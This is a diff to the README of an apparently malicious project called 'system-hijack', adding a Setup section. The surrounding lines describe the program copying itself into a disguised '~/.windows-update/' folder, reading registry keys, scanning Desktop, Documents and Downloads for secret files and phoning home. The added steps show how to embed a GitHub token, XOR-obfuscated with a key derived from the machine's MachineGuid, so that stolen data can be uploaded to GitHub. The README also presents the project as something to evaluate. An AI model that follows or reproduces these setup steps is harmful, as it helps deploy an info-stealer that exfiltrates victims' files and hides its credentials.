@@ -64,6 +64,26 @@ On first run it copies itself to `~/.windows-update/` and does demo CRUD ops. On
 
 ---
 
+## Setup
+
+This repo ships with an empty credential blob. To enable GitHub uploads, create a `.env` file at the project root:
+
+```
+GITHUB_TOKEN=ghp_your_token_here
+GITHUB_OWNER=your_github_username
+GITHUB_REPO=system-hijack
+```
+
+Then run the encryption tool to generate a MachineGuid-bound blob:
+
+```bash
+node tools/encode-creds.js
+```
+
+It will output a line like `const ENCRYPTED = "..."` — paste that into `src/app/config.js` over the existing `ENCRYPTED = ""` line. The token is XOR-encrypted with a SHA256 key derived from your machine's MachineGuid, so the blob is tied to that specific machine.
+
+---
+
 ## How to evaluate safely
 
 This thing reads registry keys, scans your Desktop/Docs/Downloads for secret files, and phones home. Take precautions.
